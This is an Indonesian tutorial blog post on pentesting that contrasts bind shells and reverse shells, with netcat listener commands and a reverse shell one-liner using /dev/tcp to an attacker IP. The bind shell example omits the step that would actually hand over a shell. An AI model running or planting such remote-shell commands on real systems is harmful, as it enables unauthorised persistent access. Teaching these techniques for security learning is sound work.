---
title: Bind dan Reverse Shell
date: 2024-11-29
categories: [Pentesting]
tags: [Security, Exploitation]
---



Setelah berhasil mendapatkan akses ke sistem target, biasanya dilakukan oleh attacker adalah mempertahankan akses ke sistem tersebut. Salah satu teknik yang sering digunakan untuk mempertahankan akses adalah dengan menggunakan `Bind Shell` atau `Reverse Shell`.

### Perbedaan antara Bind dan Reverse Shell

| **Aspek**           | **Bind Shell**                                                                 | **Reverse Shell**                                                               |
|---------------------|-------------------------------------------------------------------------------|--------------------------------------------------------------------------------|
| **Definisi**         | Sebuah shell yang "mengikat" ke port tertentu pada target, menunggu koneksi dari penyerang. | Sebuah shell yang diinisiasi oleh target dengan menghubungi mesin penyerang.  |
| **Inisiasi Koneksi**| Penyerang menghubungi target secara langsung.                                | Target menghubungi penyerang untuk memulai koneksi.                            |
| **Port**             | Target membuka port yang dapat diakses oleh penyerang.                     | Penyerang membuka port yang akan dihubungi oleh target.                        |
| **Firewall**         | Dapat dicegah jika firewall memblokir port yang dibuka oleh target.         | Lebih sulit dicegah karena koneksi keluar biasanya diizinkan oleh firewall.    |
| **Keamanan**         | Lebih mudah terdeteksi karena port terbuka pada target.                    | Lebih sulit terdeteksi karena memanfaatkan koneksi keluar yang sering diizinkan.|

## Gambaran sederhana

### Bind Shell

{{<mermaid>}}

flowchart RL
    A[Attacker] --> B[Server]

{{</mermaid>}}

Attacker akan membuka koneksi server untuk mendapatkan akses shell.

###  Reverse Shell

{{<mermaid>}}

flowchart LR
    A[Server] --> B[Attacker]

{{</mermaid>}}

Server akan membuka koneksi ke attacker untuk mendapatkan akses shell. 

## Implementasi Sedehana

Pada kasus ini, kita akan menggunakan `nc` untuk membuat bind dan reverse shell. yang akan digunakan untuk membuat koneksi shell antara attacker dan server. Secara default, `nc` tersedia di sistem operasi Linux, tetapi jika menggunakan sistem operasi seperti `Windows`, sehingga dapat menginstalnya secara manual.

```bash
$ sudo apt install nc
```

### Bind Shell

Asumsikan sudah ada akses terminal server dan kita ingin membuat bind shell pada port `4444`

```bash
server@administrator ~ $ nc -lnvp 4444
```

Maka attacker dapat terhubung ke server dengan output sebagai berikut:

```bash
attacker@ubuntu2404 ~ $ nc <server_ip> 4444
server@administrator ~ $ whoami
server
```
{{< alert >}}
> **Catatan**: Penggunaan `bind shell` cenderung lebih mudah terdeteksi karena port terbuka pada target.
{{< /alert >}}

### Reverse Shell

Misalkan belum ada akses ke terminal server, attacker akan membuat reverse shell pada port `9999`
Asumsikan telah mengeksekusi script berdasarkan interaksi user pada server:

```bash
#file: shell.sh
sh -i >& /dev/tcp/<attacker_ip>/9999 0>&1
```

Maka server akan terhubung ke attacker dengan output sebagai berikut:

```bash
attacker@ubuntu2404 ~ $ nc -lnvp 9999
# user execute the script by running `shell.sh`
server@administrator ~ $
server@administrator ~ $ whoami
server
```

## Kesimpulan

Dengan menggunakan `Bind Shell` atau `Reverse Shell`, attacker dapat mempertahankan akses ke sistem target. Namun, perlu diingat bahwa penggunaan `Bind Shell` cenderung lebih mudah terdeteksi karena port terbuka pada target. Sebaliknya, `Reverse Shell` lebih sulit terdeteksi karena memanfaatkan koneksi keluar yang sering diizinkan oleh firewall.

Terima kasih :)